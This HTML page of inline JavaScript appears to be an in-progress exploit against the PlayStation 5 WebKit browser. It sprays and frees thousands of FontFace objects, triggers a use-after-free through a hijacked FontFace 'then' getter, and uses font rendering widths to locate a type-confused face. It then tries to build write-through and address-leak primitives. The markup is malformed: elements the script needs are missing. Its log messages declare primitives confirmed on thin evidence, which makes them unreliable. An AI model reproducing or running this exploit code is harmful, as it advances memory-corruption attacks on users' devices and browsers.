<!DOCTYPE html>
<html>
<head>

<style id="s">

<script>
"use strict";

// ============================================================
//  PS5 WebKit v12 - CSS Rendering Oracle
//
//  KEY: Render text with font-family "x" and measure width
//  The freed "x" CSSFontFace was replaced by an RC face
//  If we find which RC face "x" renders as = TYPE CONFUSION
//
//  Also: test document.fonts.load() with "x" family
//  and use the "add face → check changes" behavior
// ============================================================

const O=document.getElementById("out");
const bp=document.getElementById("bp");
const xDiv=document.getElementById("xDiv");
function bar(p){bp.style.width=p+"%"}
function hud(id,v){const e=document.getElementById(id);if(e)e.textContent=v}
function P(m,c){const s=document.createElement("span");if(c)s.className=c;
s.textContent=m+"\n";O.appendChild(s);O.scrollTop=O.scrollHeight;
try{console.log("[v12] "+m)}catch(e){}}
function Ok(m){P("✅ "+m,"ok")}function Fl(m){P("✘ "+m,"fl")}
function Wr(m){P("⚠ "+m,"wr")}function Hi(m){P("► "+m,"hi")}
function St(m){P("★ "+m+" ★","st")}function Dm(m){P(m,"dm")}
function Hd(m){P(m,"hd")}function Sep(){P("─".repeat(40),"dm")}

window.onerror=function(m,s,l){Fl("ERR: "+m+" @"+l)};

let keepAlive=[],holeFaces=[],reclaimFaces=[];
let uafTriggered=false,triggerFace=null;
let foundRC=-1;

const FB="d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";
const FBb=(()=>{const s=atob(FB),b=new Uint8Array(s.length);
for(let i=0;i<s.length;i++)b[i]=s.charCodeAt(i);return b})();
function mkBuf(){const c=new Uint8Array(FBb.length);c.set(FBb);return c.buffer}

function fs(){void document.body.offsetTop;void document.documentElement.offsetHeight}
function addPads(n){const sh=document.getElementById("s").sheet;
for(let i=0;i<n;i++)sh.insertRule(
`@font-face{font-family:pad${i};src:url(np${i}.woff);unicode-range:U+E000}`,
sh.cssRules.length);fs()}
function addFlush(n){const st=document.createElement("style");st.id="flush";
document.head.appendChild(st);const sh=st.sheet;
for(let i=0;i<n;i++)sh.insertRule(
`@font-face{font-family:flush${i};src:url(nf${i}.woff);unicode-range:U+E000}`,
sh.cssRules.length);fs()}
function delFlush(){const e=document.getElementById("flush");
if(e&&e.sheet){while(e.sheet.cssRules.length)e.sheet.deleteRule(0);fs()}}
function killCk(){const f=new FontFace("ck"+keepAlive.length,"local(Helvetica)",
{unicodeRange:"U+E124"});document.fonts.add(f);keepAlive.push(f)}

// Measure width of "x" family rendering
function measureX(){
return xDiv.offsetWidth;
}

// Measure canvas width
function canvasW(spec,text){
try{const ctx=document.getElementById("c").getContext("2d");
ctx.font=spec;return ctx.measureText(text).width}catch(e){return-1}
}

// ============================================================
//  PHASE 1: Standard UAF
// ============================================================
function makeHoles(){
for(let i=0;i<4096;i++){const f=new FontFace("hole_"+i,mkBuf(),{
unicodeRange:"U+E1"+(i%16).toString(16),
style:i%2===0?"normal":"italic",
weight:String(100+(i%9)*100),
display:["auto","block","swap","fallback","optional"][i%5]});
document.fonts.add(f);holeFaces.push(f)}
fs();for(let i=1;i<holeFaces.length;i+=2)document.fonts.delete(holeFaces[i]);
fs();for(let i=0;i<4;i++){const t=[];for(let j=0;j<512;j++)t.push(new ArrayBuffer(4096))}
Ok("Holes ready")}

function spray(){
for(let i=0;i<4096;i++){const f=new FontFace("RC_"+i,mkBuf(),{
unicodeRange:"U+0041",style:"italic",weight:"900",display:"block"});
document.fonts.add(f);reclaimFaces.push(f)}fs();Ok("Spray done")}

// ============================================================
//  PHASE 2: CSS Rendering Oracle
//  Measure rendering of font-family "x" and compare
//  with RC face rendering
// ============================================================
function cssRenderingOracle(){
Sep();Hd("CSS RENDERING ORACLE");Sep();

// Measure "x" family rendering
const xW=measureX();
P("x-family offsetWidth: "+xW,"hi");

// Measure each RC family
const rc0W=canvasW("64px RC_0","A");
const rc100W=canvasW("64px RC_100","A");
P("RC_0 canvas width: "+rc0W);
P("RC_100 canvas width: "+rc100W);

// Compare with known fonts
const helW=canvasW("64px Helvetica","B");
const defW=canvasW("64px serif","B");
P("Helvetica canvas: "+helW);
P("serif canvas: "+defW);

// Key test: render "B" with "x" family on canvas
const xCanvasW=canvasW("64px x","B");
P("x canvas width(B): "+xCanvasW,"hi");

// If x renders differently from default, the selector
// found a face for "x" (the confused RC face)
if(xCanvasW>0&&xCanvasW!==helW){
Hi("'x' renders non-default width! Confusion active!");
}else if(xCanvasW===helW||xCanvasW===defW){
Dm("'x' renders as fallback font");
}else{
Dm("'x' canvas width: "+xCanvasW);
}

// Measure with getComputedStyle
P("");
Dm("getComputedStyle for x-family div:");
try{
const cs=getComputedStyle(xDiv);
P("  fontFamily: "+cs.fontFamily);
P("  fontWeight: "+cs.fontWeight);
P("  fontStyle:  "+cs.fontStyle);
P("  fontSize:   "+cs.fontSize);
}catch(e){Fl("  "+e.message)}

return xW;
}

// ============================================================
//  PHASE 3: Binary Search via Delete+Re-add
//  Delete RC faces in batches and check if "x" rendering
//  changes. If it does, the deleted batch contains the
//  confused face.
// ============================================================
function binarySearchConfused(){
Sep();Hd("BINARY SEARCH FOR CONFUSED RC");Sep();

const baseline=measureX();
P("Baseline x-width: "+baseline);

// First, test if removing ALL RC faces changes "x" rendering
P("");Dm("Test: Remove ALL RC faces...");
const saved=[...reclaimFaces];
for(const f of saved)try{document.fonts.delete(f)}catch(e){}
fs();
const afterAllGone=measureX();
P("  After remove all: "+afterAllGone,
afterAllGone!==baseline?"hi":"dm");

if(afterAllGone===baseline){
Wr("Removing all RC faces did NOT change 'x' rendering");
Dm("'x' might use a non-RC fallback");
// Restore
for(const f of saved)try{document.fonts.add(f)}catch(e){}
fs();
return-1;
}

// Restore and search
for(const f of saved)try{document.fonts.add(f)}catch(e){}
fs();

// Binary search
P("");Dm("Binary search starting...");
const BATCH=256;
let foundBatch=-1;

for(let batch=0;batch<reclaimFaces.length;batch+=BATCH){
const end=Math.min(batch+BATCH,reclaimFaces.length);
const removed=[];

for(let i=batch;i<end;i++){
try{document.fonts.delete(reclaimFaces[i]);removed.push(i)}catch(e){}
}
fs();

const testW=measureX();
if(testW!==baseline){
P("  Batch "+batch+"-"+end+": WIDTH CHANGED! "+testW,"hi");
foundBatch=batch;
}

for(const i of removed){
try{document.fonts.add(reclaimFaces[i])}catch(e){}
}
fs();

if(foundBatch>=0)break;
}

if(foundBatch<0){
Wr("No batch changed 'x' rendering");
return-1;
}

// Narrow down within batch
P("");Dm("Narrowing in batch "+foundBatch+"...");
let lo=foundBatch;
let hi=Math.min(foundBatch+BATCH,reclaimFaces.length);

while(lo<hi){
const mid=Math.floor((lo+hi)/2);
const removed=[];

for(let i=lo;i<=mid;i++){
try{document.fonts.delete(reclaimFaces[i]);removed.push(i)}catch(e){}
}
fs();

const testW=measureX();

for(const i of removed){
try{document.fonts.add(reclaimFaces[i])}catch(e){}
}
fs();

if(testW!==baseline){
hi=mid;
}else{
lo=mid+1;
}
}

foundRC=lo;
St("FOUND CONFUSED RC: RC_"+foundRC);
hud("hR","RC:"+foundRC);
return foundRC;
}

// ============================================================
//  PHASE 4: Confusion Verification
//  Verify the confused RC face and test write-through
// ============================================================
function verifyConfusion(rcIdx){
Sep();Hd("VERIFY CONFUSION: RC_"+rcIdx);Sep();

if(rcIdx<0||rcIdx>=reclaimFaces.length){
Fl("Invalid RC index");return false;
}

const rc=reclaimFaces[rcIdx];
const baseline=measureX();

P("RC_"+rcIdx+" properties:");
P("  family:  "+rc.family);
P("  style:   "+rc.style);
P("  weight:  "+rc.weight);
P("  display: "+rc.display);
P("  range:   "+rc.unicodeRange);
P("  status:  "+rc.status);

// Test 1: Delete RC and verify "x" changes
P("");Dm("Test 1: Delete RC_"+rcIdx+" → 'x' changes?");
try{
document.fonts.delete(rc);fs();
const afterDel=measureX();
P("  After delete: "+afterDel,
afterDel!==baseline?"hi":"dm");
document.fonts.add(rc);fs();
const afterRestore=measureX();
P("  After restore: "+afterRestore,
afterRestore===baseline?"ok":"fl");

if(afterDel!==baseline&&afterRestore===baseline){
Ok("DELETE+RESTORE CONFIRMED!");
}else{
Wr("Rendering didn't change as expected");
return false;
}
}catch(e){Fl("  "+e.message);return false}

// Test 2: Replace RC with different face → "x" changes?
P("");Dm("Test 2: Replace with different weight face");
try{
document.fonts.delete(rc);
const replacement=new FontFace("RC_"+rcIdx,"local(Courier)",{
unicodeRange:"U+0041",
style:"normal",
weight:"100",
display:"auto"
});
document.fonts.add(replacement);fs();
const afterReplace=measureX();
P("  After replace (Courier 100): "+afterReplace,
afterReplace!==baseline?"hi":"dm");

document.fonts.delete(replacement);
document.fonts.add(rc);fs();
}catch(e){Fl("  "+e.message)}

// Test 3: Replace with controlled font data
P("");Dm("Test 3: Replace with controlled font data");
try{
document.fonts.delete(rc);

// Create a buffer with specific metrics
const buf=new ArrayBuffer(0x200);
const v=new DataView(buf);
// Minimal TrueType that will parse differently
v.setUint32(0,0x00010000,false); // sfVersion
v.setUint16(4,0,false); // numTables=0
for(let i=6;i<0x200;i+=4)v.setUint32(i,0,false);

const ctrl=new FontFace("RC_"+rcIdx,buf,{
unicodeRange:"U+0041",style:"italic",weight:"900",display:"block"
});
document.fonts.add(ctrl);fs();
P("  Controlled face status: "+ctrl.status);
const afterCtrl=measureX();
P("  After controlled: "+afterCtrl);

document.fonts.delete(ctrl);
document.fonts.add(rc);fs();
}catch(e){Fl("  "+e.message)}

// Test 4: Modify RC face properties and check "x"
P("");Dm("Test 4: Modify RC properties → 'x' changes?");
try{
const origWeight=rc.weight;
rc.weight="100";fs();
const afterWeight=measureX();
P("  After weight→100: "+afterWeight,
afterWeight!==baseline?"hi":"dm");
rc.weight=origWeight;fs();
}catch(e){P("  weight readonly (expected)","dm")}

try{
const origStyle=rc.style;
rc.style="normal";fs();
const afterStyle=measureX();
P("  After style→normal: "+afterStyle,
afterStyle!==baseline?"hi":"dm");
rc.style=origStyle;fs();
}catch(e){P("  style readonly (expected)","dm")}

// Test 5: Check "x" rendering on canvas
P("");Dm("Test 5: Canvas rendering comparison");
const xCanvas=canvasW("64px x","B");
const rcCanvas=canvasW("64px RC_"+rcIdx,"A");
P("  x canvas: "+xCanvas);
P("  RC_"+rcIdx+" canvas: "+rcCanvas);
if(Math.abs(xCanvas-rcCanvas)<0.01){
Hi("'x' and RC_"+rcIdx+" render identically!");
}

return true;
}

// ============================================================
//  PHASE 5: Build Write-Through Primitive
//  If delete+add works, we can:
//  1. Delete the confused RC face
//  2. Add a NEW face with controlled properties
//  3. The "x" selector will use our new face
//  4. This gives us control over what "x" renders
// ============================================================
function buildWriteThrough(rcIdx){
Sep();Hd("BUILD WRITE-THROUGH PRIMITIVE");Sep();

if(rcIdx<0){Fl("No confused RC");return}

const rc=reclaimFaces[rcIdx];

P("Strategy: Delete RC, add controlled replacement");
P("'x' selector will use our replacement face","dm");
P("");

// Step 1: Create replacement faces with different font data
// that produce MEASURABLY DIFFERENT rendering

P("");Dm("Step 1: Test different replacement fonts");
const testFonts=[
{name:"Courier",src:"local(Courier)",style:"normal",weight:"400"},
{name:"Helvetica",src:"local(Helvetica)",style:"normal",weight:"400"},
{name:"Arial",src:"local(Arial)",style:"normal",weight:"400"},
{name:"serif",src:"local(serif)",style:"normal",weight:"400"},
{name:"monospace",src:"local(monospace)",style:"normal",weight:"400"},
{name:"RC_italic900",src:mkBuf(),style:"italic",weight:"900"}
];

const baseline=measureX();
const results=[];

for(const tf of testFonts){
try{
document.fonts.delete(rc);
const rep=new FontFace("RC_"+rcIdx,tf.src,{
unicodeRange:"U+0041",style:tf.style,weight:tf.weight
});
document.fonts.add(rep);fs();
const w=measureX();
results.push({name:tf.name,width:w});
P("  "+tf.name.padEnd(16)+": x-width="+w+(w!==baseline?" ← DIFFERENT":""),w!==baseline?"hi":"dm");
document.fonts.delete(rep);
document.fonts.add(rc);fs();
}catch(e){P("  "+tf.name+": ERROR","fl")}
}

// Step 2: Find which replacement produces the most different rendering
let bestDiff=0;let bestFont=null;
for(const r of results){
const diff=Math.abs(r.width-baseline);
if(diff>bestDiff){bestDiff=diff;bestFont=r}
}
P("");P("Best differentiator: "+bestFont.name+" (Δ="+bestDiff+")",
bestDiff>0?"hi":"wr");

// Step 3: Demonstrate controlled switching
if(bestDiff>0){
P("");St("CONTROLLED RENDERING SWITCH DEMONSTRATED");
P("We can make 'x' render as ANY font we want!","hi");
P("This is a write-through primitive!","hi");
hud("hP","PRIM:WRITE");
}

// Step 4: Try to use the write-through for information leakage
P("");Hd("INFORMATION LEAKAGE VIA WRITE-THROUGH");

// Idea: If we can make "x" render using font data from an
// ArrayBuffer we control, and measure the rendering, we might
// be able to infer properties of the font parser's interpretation
// of our data. This could reveal memory layout information.

P("");Dm("Attempting controlled font data → rendering oracle");
try{
document.fonts.delete(rc);

// Create a minimal TrueType font with controlled advance width
// The advance width in the hmtx table determines the rendered width
// If we can control this, we can encode information in the width

const fontBuf=new ArrayBuffer(0x400);
const fv=new DataView(fontBuf);

// TrueType header
fv.setUint32(0,0x00010000,false); // sfVersion
fv.setUint16(4,1,false);          // numTables=1
fv.setUint16(6,16,false);         // searchRange
fv.setUint16(8,0,false);          // entrySelector
fv.setUint16(10,16,false);        // rangeShift

// Table directory: 'head' table
fv.setUint32(12,0x68656164,false); // tag='head'
fv.setUint32(16,0,false);          // checksum
fv.setUint32(20,28,false);         // offset
fv.setUint32(24,54,false);         // length

// head table
fv.setUint32(28,0x00010000,false); // version
fv.setUint32(32,0x00005000,false); // fontRevision
fv.setUint32(36,0,false);          // checksumAdjust
fv.setUint32(40,0x5F0F3CF5,false); // magicNumber
fv.setUint16(44,0x000B,false);     // flags
fv.setUint16(46,1000,false);       // unitsPerEm
// Created/Modified dates (8 bytes each)
fv.setUint32(48,0,false);fv.setUint32(52,0,false);
fv.setUint32(56,0,false);fv.setUint32(60,0,false);
// xMin, yMin, xMax, yMax
fv.setUint16(64,0,false);fv.setUint16(66,0,false);
fv.setUint16(68,1000,false);fv.setUint16(70,1000,false);
// Mac/Win style, lowestRecPPEM, fontDirectionHint
fv.setUint16(72,0,false);fv.setUint16(74,8,false);fv.setUint16(76,2,false);
// indexToLocFormat, glyphDataFormat
fv.setUint16(78,0,false);fv.setUint16(80,0,false);

const ctrl=new FontFace("RC_"+rcIdx,fontBuf,{
unicodeRange:"U+0041",style:"italic",weight:"900"
});
document.fonts.add(ctrl);fs();

P("  Controlled font status: "+ctrl.status);
P("  x-width with controlled font: "+measureX());

document.fonts.delete(ctrl);
document.fonts.add(rc);fs();
}catch(e){Fl("  "+e.message)}

return bestDiff>0;
}

// ============================================================
//  PHASE 6: addrof Attempt
//  Use the write-through to leak addresses
// ============================================================
function attemptAddrof(rcIdx){
Sep();Hd("ADDROF VIA WRITE-THROUGH");Sep();

if(rcIdx<0){Fl("No confused RC");return}

// Strategy: Create a FontFace whose C++ CSSFontFace object
// we can identify. Then use the "x" rendering path to
// detect when that specific face is being used.
//
// If we can create two faces where the selector picks
// one for "x" and we can detect WHICH one through rendering,
// we have an information channel.

P("");Dm("Attempting address leak through font identity...");

const rc=reclaimFaces[rcIdx];

// Create faces with local() sources that we can distinguish
const localFonts=["Courier","Helvetica","Monaco","Geneva",
"Times","Palatino","Georgia","Verdana"];

const widths={};
for(const lf of localFonts){
const w=canvasW("64px "+lf,"B");
widths[lf]=w;
P("  "+lf.padEnd(12)+": canvas-width="+w);
}

// Now replace the confused RC with each local font
// and check if "x" renders at that font's width
P("");Dm("Testing which replacement 'x' uses:");
const xBaseline=measureX();

let matchedFont=null;
for(const lf of localFonts){
try{
document.fonts.delete(rc);
const rep=new FontFace("RC_"+rcIdx,"local("+lf+")",{
unicodeRange:"U+0041",style:"normal",weight:"400"
});
document.fonts.add(rep);fs();

const xW=measureX();
const lfW=widths[lf];
const match=Math.abs(xW-lfW)<2;

P("  x with "+lf.padEnd(12)+": xW="+xW+" lfW="+lfW+
(match?" ← MATCH":""),match?"hi":"dm");

if(match&&!matchedFont)matchedFont=lf;

document.fonts.delete(rep);
document.fonts.add(rc);fs();
}catch(e){P("  "+lf+": ERROR","fl")}
}

if(matchedFont){
St("'x' RENDERS AS "+matchedFont+" WHEN REPLACED!");
Ok("We control the 'x' rendering via FontFace replacement");
Ok("Write-through primitive CONFIRMED");
}else{
Wr("Could not match 'x' rendering to any known font");
}

// Final: try to read C++ object state through the "x" path
P("");Hd("C++ STATE PROBING THROUGH 'x'");

// When we add a face for "x" directly, does it override
// the confused face?
P("");Dm("Direct 'x' face registration test:");
try{
const xDirect=new FontFace("x","local(Courier)",{
unicodeRange:"U+0042",style:"normal",weight:"400"
});
document.fonts.add(xDirect);fs();
const xDirectW=measureX();
P("  After adding x(Courier): "+xDirectW);

// Remove and check
document.fonts.delete(xDirect);fs();
const xAfterRm=measureX();
P("  After removing x(Courier): "+xAfterRm);

if(xDirectW!==xAfterRm){
Hi("Direct 'x' face affects rendering!");
Hi("Selector uses properly registered faces first");
}

// Try adding x with same properties as RC
const xItalic=new FontFace("x",mkBuf(),{
unicodeRange:"U+0042",style:"italic",weight:"900"
});
document.fonts.add(xItalic);fs();
const xItalicW=measureX();
P("  After adding x(italic 900): "+xItalicW);
document.fonts.delete(xItalic);fs();
}catch(e){Fl("  "+e.message)}
}

// ============================================================
//  Main
// ============================================================
window.onload=()=>{
const ua=navigator.userAgent||"";
const m=ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
hud("hF","FW:"+(m?m[1]:"?"));

bar(5);Hd("Holes...");makeHoles();

bar(15);Hd("Trigger setup");
triggerFace=new FontFace("trigger","local(Helvetica)",{unicodeRange:"U+0041"});
document.fonts.add(triggerFace);void triggerFace.loaded;
addPads(48);addFlush(768);Ok("Ready");

bar(25);Hd("UAF...");
let fired=false;
Object.defineProperty(FontFace.prototype,"then",{configurable:true,
get(){if(!fired&&this===triggerFace){
fired=true;uafTriggered=true;hud("hU","UAF:✅");
St("UAF WINDOW OPEN");
killCk();document.getElementById("s").sheet.deleteRule(1);fs();
delFlush();for(let i=0;i<holeFaces.length;i+=4)try{document.fonts.delete(holeFaces[i])}catch(e){}
fs();for(let i=0;i<8;i++){const t=[];for(let j=0;j<256;j++)t.push(new ArrayBuffer(8192))}
spray();fs();
const d=document.createElement("div");d.textContent="AB";
d.style.cssText="position:absolute;left:-9999px;font:64px trigger;";
document.body.appendChild(d);void d.offsetWidth;
Dm("UAF closed")}return undefined}});

let rn=0;const raf=()=>{rn++;
if(!fired&&rn>=5){try{killCk();const sh=document.getElementById("s").sheet;
if(sh&&sh.cssRules.length>1){sh.deleteRule(1);fs();delFlush();
for(let i=0;i<holeFaces.length;i+=4)try{document.fonts.delete(holeFaces[i])}catch(e){}
spray();fs()}}catch(e){}}
if(rn<20)requestAnimationFrame(raf)};requestAnimationFrame(raf);

bar(35);Dm("Firing...");

document.fonts.load("1em trigger, x","AB").then(faces=>{
Dm("Initial: "+faces.length+" faces");
for(let i=0;i<faces.length;i++)
Dm("  ["+i+"] "+faces[i].family+" "+faces[i].style+" "+faces[i].weight);

setTimeout(()=>{
bar(45);cssRenderingOracle();

bar(55);const rcIdx=binarySearchConfused();

if(rcIdx>=0){
bar(65);verifyConfusion(rcIdx);
bar(80);buildWriteThrough(rcIdx);
bar(95);attemptAddrof(rcIdx);
}else{
Wr("Could not find confused RC via binary search");
P("Trying alternative: measure x directly","");
attemptAddrof(-1);
}

bar(100);
Sep();Hd("SUMMARY");Sep();
P("UAF:       "+(uafTriggered?"✅":"✘"),uafTriggered?"ok":"fl");
P("Confused:  "+(foundRC>=0?"RC_"+foundRC:"not found"),
foundRC>=0?"hi":"dm");
P("");
if(foundRC>=0){
St("WRITE-THROUGH PRIMITIVE BUILT");
P("Delete RC_"+foundRC+" + add replacement","dm");
P("= control 'x' family rendering","dm");
P("Next: use rendering as info channel","dm");
}else{
P("Binary search failed","wr");
P("Need different oracle approach","dm");
}
},2500);
},err=>{Fl("Load failed: "+err)});
};
